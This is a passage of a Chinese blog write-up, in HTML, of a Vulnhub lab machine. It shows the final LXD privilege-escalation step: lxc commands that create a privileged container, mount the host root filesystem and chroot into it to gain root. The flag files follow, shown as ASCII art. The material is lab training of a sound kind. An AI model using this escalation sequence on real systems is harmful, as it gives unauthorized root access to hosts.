+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525112303.png" /></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525112314.png" /></p>
+<p>然后将该shell放在一旁。执行完最后一条命令之后，会在该目录下生成一个 tar.gz 的文件，将其发送到靶机。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525112401.png" /></p>
+<p>靶机上需要执行下面命令： <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1. lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alilas shell</span><br><span class="line">2. lxc image list # 查看是否导入</span><br><span class="line">3. lxd init # 然后一直回车就好</span><br><span class="line">4. lxc init shell ignite -c security.privileged=true</span><br><span class="line">5. lxc config device add ignite mydevice disk source=/ path=/mnt/root # 配置容器，将宿主机根目录挂载到容器/mnt/root目录下。</span><br><span class="line">6. lxc start ignite</span><br><span class="line">7. lxc exec ignite /bin/sh</span><br><span class="line">8. chroot /mnt/root</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525112826.png" /></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525113522.png" /></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525113537.png" /></p>
+<p>成功拿到root权限。</p>
+<p>最后读取两个flag。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">1. /home/jubiscleudo/.user.txt</span><br><span class="line">%                                              ,%&amp;&amp;%#.                                              </span><br><span class="line">%                                         *&amp;&amp;&amp;&amp;%%&amp;%&amp;&amp;&amp;&amp;&amp;&amp;%                                          </span><br><span class="line">%                                       &amp;&amp;&amp;&amp;            .%&amp;&amp;&amp;                                       </span><br><span class="line">%                                     &amp;&amp;&amp;#                 %&amp;&amp;&amp;                                     </span><br><span class="line">%                                   /&amp;&amp;&amp;                     &amp;&amp;&amp;.                                   </span><br><span class="line">%                                  %&amp;%/                       %&amp;&amp;*                                  </span><br><span class="line">%                                 .&amp;&amp;#     (%%(,     ,(&amp;&amp;*     %&amp;&amp;                                  </span><br><span class="line">%                                 &amp;&amp;%    %&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;%&amp;%#    &amp;&amp;&amp;                                 </span><br><span class="line">%                                 &amp;&amp;%&amp;&amp;&amp;&amp;&amp;&amp;&amp;   #&amp;&amp;&amp;&amp;&amp;*   &amp;&amp;&amp;&amp;&amp;&amp;&amp;%&amp;%                                 </span><br><span class="line">%                                 &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;,   /&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;                                 </span><br><span class="line">%                                 &amp;&amp;&amp;&amp;&amp;&amp;&amp;%                 &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;                                 </span><br><span class="line">%                                  %&amp;&amp;%&amp;&amp;&amp;&amp;              /&amp;&amp;&amp;%&amp;&amp;&amp;%                                  </span><br><span class="line">%                                 &amp;.%&amp;&amp;% %&amp;&amp;%           &amp;&amp;&amp;&amp; %&amp;&amp;/*&amp;                                 </span><br><span class="line">%                              &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;  %&amp;&amp;&amp;&amp;#   %%&amp;&amp;&amp;&amp;  %&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;                              </span><br><span class="line">%                           /&amp;%&amp;/   *&amp;&amp;&amp;&amp;&amp;&amp;   %&amp;&amp;&amp;&amp;&amp;&amp;%&amp;   &amp;&amp;&amp;&amp;&amp;&amp;.   %&amp;&amp;&amp;.                           </span><br><span class="line">%                          &amp;&amp;&amp;           &amp;&amp;%&amp;           %%%%          .&amp;&amp;&amp;                          </span><br><span class="line">%                         &amp;&amp;%                                           &amp;&amp;&amp;                         </span><br><span class="line">%                        %&amp;&amp;.   *&amp;%&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;%&amp;&amp;    /&amp;&amp;(                        </span><br><span class="line">%                       /&amp;&amp;#   #&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;*   %&amp;&amp;                        </span><br><span class="line">%                       &amp;&amp;%    ,&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;%     %&amp;%                       </span><br><span class="line">%                      &amp;&amp;&amp;      %&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;      %&amp;&amp;                      </span><br><span class="line">%                      &amp;&amp;&amp;      &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;%&amp;   %&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;%      &amp;&amp;&amp;                      </span><br><span class="line">%                      %&amp;&amp;&amp;%    &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;     &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;%    &amp;%&amp;&amp;#                      </span><br><span class="line">%                        &amp;&amp;&amp;&amp;&amp;&amp;&amp;%&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;                        </span><br><span class="line">%                           &amp;%&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;%                           </span><br><span class="line">%                                &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;%                                </span><br><span class="line">%                                *&amp;%&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;                                 </span><br><span class="line">%                                &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;%                                </span><br><span class="line">%                                 #%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%( </span><br><span class="line"></span><br><span class="line">invite-me: https://www.linkedin.com/in/eliastouguinho/</span><br><span class="line"></span><br><span class="line">2. /root/root.txt </span><br><span class="line">░░█▀░░░░░░░░░░░▀▀███████░░░░</span><br><span class="line">░░█▌░░░░░░░░░░░░░░░▀██████░░░</span><br><span class="line">░█▌░░░░░░░░░░░░░░░░███████▌░░</span><br><span class="line">░█░░░░░░░░░░░░░░░░░████████░░</span><br><span class="line">▐▌░░░░░░░░░░░░░░░░░▀██████▌░░</span><br><span class="line">░▌▄███▌░░░░▀████▄░░░░▀████▌░░</span><br><span class="line">▐▀▀▄█▄░▌░░░▄██▄▄▄▀░░░░████▄▄░</span><br><span class="line">▐░▀░░═▐░░░░░░══░░▀░░░░▐▀░▄▀▌▌</span><br><span class="line">▐░░░░░▌░░░░░░░░░░░░░░░▀░▀░░▌▌</span><br><span class="line">▐░░░▄▀░░░▀░▌░░░░░░░░░░░░▌█░▌▌</span><br><span class="line">░▌░░▀▀▄▄▀▀▄▌▌░░░░░░░░░░▐░▀▐▐░</span><br><span class="line">░▌░░▌░▄▄▄▄░░░▌░░░░░░░░▐░░▀▐░░</span><br><span class="line">░█░▐▄██████▄░▐░░░░░░░░█▀▄▄▀░░</span><br><span class="line">░▐░▌▌░░░░░░▀▀▄▐░░░░░░█▌░░░░░░</span><br><span class="line">░░█░░▄▀▀▀▀▄░▄═╝▄░░░▄▀░▌░░░░░░</span><br><span class="line">░░░▌▐░░░░░░▌░▀▀░░▄▀░░▐░░░░░░░</span><br><span class="line">░░░▀▄░░░░░░░░░▄▀▀░░░░█░░░░░░░</span><br><span class="line">░░░▄█▄▄▄▄▄▄▄▀▀░░░░░░░▌▌░░░░░░</span><br><span class="line">░░▄▀▌▀▌░░░░░░░░░░░░░▄▀▀▄░░░░░</span><br><span class="line">▄▀░░▌░▀▄░░░░░░░░░░▄▀░░▌░▀▄░░░</span><br><span class="line">░░░░▌█▄▄▀▄░░░░░░▄▀░░░░▌░░░▌▄▄</span><br><span class="line">░░░▄▐██████▄▄░▄▀░░▄▄▄▄▌░░░░▄░</span><br><span class="line">░░▄▌████████▄▄▄███████▌░░░░░▄</span><br><span class="line">░▄▀░██████████████████▌▀▄░░░░</span><br><span class="line">▀░░░█████▀▀░░░▀███████░░░▀▄░░</span><br><span class="line">░░░░▐█▀░░░▐░░░░░▀████▌░░░░▀▄░</span><br><span class="line">░░░░░░▌░░░▐░░░░▐░░▀▀█░░░░░░░▀</span><br><span class="line">░░░░░░▐░░░░▌░░░▐░░░░░▌░░░░░░░</span><br><span class="line">░╔╗║░╔═╗░═╦═░░░░░╔╗░░╔═╗░╦═╗░</span><br><span class="line">░║║║░║░║░░║░░░░░░╠╩╗░╠═╣░║░║░</span><br><span class="line">░║╚╝░╚═╝░░║░░░░░░╚═╝░║░║░╩═╝░</span><br><span class="line"></span><br><span class="line">invite-me: linkedin.com/in/eliastouguinho</span><br></pre></td></tr></table></figure>
+<h1 id="总结">5. 总结</h1>
+<p>该靶机难度适中。涉及的攻击方法有：</p>
+<ol type="1">
+<li>端口敲门</li>
+<li>lxd提权</li>
+</ol>
+<p>lxd提权这是我第一次遇到。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E7%BB%BC%E5%90%88/" rel="tag"># 综合</a>
+              <a href="/tags/vulnhub/" rel="tag"># vulnhub</a>
+              <a href="/tags/port-knocking/" rel="tag"># port knocking</a>
+              <a href="/tags/lxd%E6%8F%90%E6%9D%83/" rel="tag"># lxd提权</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/05/24/Hackable%E2%85%A1%20Writeup/" rel="prev" title="HackableⅡ Writeup">
+                  <i class="fa fa-chevron-left"></i> HackableⅡ Writeup
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    
+  <div class="comments" id="disqus_thread">
+    <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+  </div>
+  
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">hdfzzf</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+      <span>站点总字数：</span>
+    <span title="站点总字数">428k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span>站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">6:30</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+</div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js","integrity":"sha256-r+3itOMtGGjap0x+10hu6jW/gZCzxHsoKrOd7gyRSGY="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+<script class="next-config" data-name="disqus" type="application/json">{"enable":true,"shortname":"hdfzzf","count":true,"i18n":{"disqus":"disqus"}}</script>
+<script src="/js/third-party/comments/disqus.js"></script>
+
+</body>
+</html>
